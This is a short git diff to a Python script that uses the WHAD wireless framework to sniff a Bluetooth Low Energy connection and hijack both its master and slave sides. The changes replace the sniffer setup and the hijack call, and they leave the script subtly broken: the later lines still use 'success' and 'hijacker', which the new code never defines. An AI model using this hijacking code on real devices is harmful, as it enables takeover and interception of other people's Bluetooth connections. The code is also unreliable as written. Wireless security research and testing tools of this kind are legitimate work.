@@ -2,7 +2,7 @@ from whad.ble import Sniffer, Hijacker, Central, Peripheral
 from whad.device import WhadDevice
 from whad.exceptions import WhadDeviceNotFound
 from time import time,sleep
-from whad.ble.attribute import UUID
+from whad.ble.profile import UUID
 from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Read_Response
 import sys
 
@@ -16,14 +16,10 @@ if __name__ == '__main__':
             dev = WhadDevice.create(interface)
 
             sniffer = Sniffer(dev)
-            sniffer.configure(advertisements=False, connection=True)
-            sniffer.start()
-            while not sniffer.is_synchronized():
-                sleep(1)
+            connection = sniffer.wait_new_connection()
             print("Press enter to hijack.")
             input()
-            hijacker = sniffer.available_actions(Hijacker)[0]
-            success = hijacker.hijack(master=True, slave=True)
+            Hijacker(connection)
             if success:
                 print("Master and Slave successfully hijacked !")
                 central = hijacker.available_actions(Central)[0]
